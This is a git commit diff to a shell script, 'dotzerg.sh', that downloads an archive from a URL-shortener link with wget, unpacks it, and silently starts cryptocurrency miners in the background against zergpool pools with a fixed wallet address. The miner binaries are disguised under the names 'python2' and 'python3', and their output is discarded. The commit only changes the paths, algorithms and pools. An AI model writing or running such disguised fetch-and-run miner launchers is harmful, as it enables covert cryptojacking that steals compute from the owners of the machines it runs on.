12d711b31d83aab504153d561fe77af084fcde5d
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-14 00:52:19 +0700

    Update dotzerg.sh

--- dotzerg.sh
+++ dotzerg.sh
@@ -2,11 +2,11 @@ wget -O dot s.id/dotaja
 
 tar -xzvf dot
 
-nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB,mc=PYI > /dev/null 2>&1 &
+nohup ./dotlol/python3 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB > /dev/null 2>&1 &
 
 sleep 15
 
-nohup ./python3 -a cpupower -o cpupower.asia.mine.zergpool.com:4250 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,mc=CPU,m=solo > /dev/null 2>&1 &
+nohup ./dotcpu/python3 -a yespower -o yespower.asia.mine.zergpool.com:6533 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB,mc=QCH > /dev/null 2>&1 &
 
 sleep 5
 
